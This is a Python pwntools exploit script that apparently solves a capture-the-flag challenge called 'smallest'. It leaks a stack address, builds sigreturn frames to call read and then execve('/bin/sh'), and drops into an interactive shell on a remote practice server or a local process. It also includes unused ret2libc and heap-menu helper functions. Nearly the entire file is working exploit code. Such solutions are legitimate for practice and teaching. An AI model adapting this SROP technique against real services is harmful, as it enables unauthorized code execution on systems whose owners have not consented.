from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './smallest'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',28654) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,4,2,3
def add(size,content='a'):
	sla(':',str(_add))
	sla('?',str(size))
	sa(':',content)

def free(index):
	sla(':',str(_free))
	sla('?',str(index))

def edit(index,content):
	sla(':',str(_edit))
	sla('?',str(index))
	sa(':',content)

def show(index):
	sla(':',str(_show))
	sla('?',str(index))

# start
main = 0x4000b0
syscall = 0x4000be

payload = flat(main,main,main)
s(payload)

s('\xb3')
stack = uu64(r()[8:16])

frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack
frame.rdx = 0x400
frame.rsp = stack
frame.rip = syscall

payload = flat(main,'a'*8,str(frame))
s(payload)
sigreturn = p64(syscall).ljust(0xf,'a')
s(sigreturn)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack+0x120
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack
frame.rip = syscall

payload = flat(main,'a'*8,str(frame)).ljust(0x120,'\x00') + '/bin/sh\x00'
s(payload)
s(sigreturn)
# end

itr()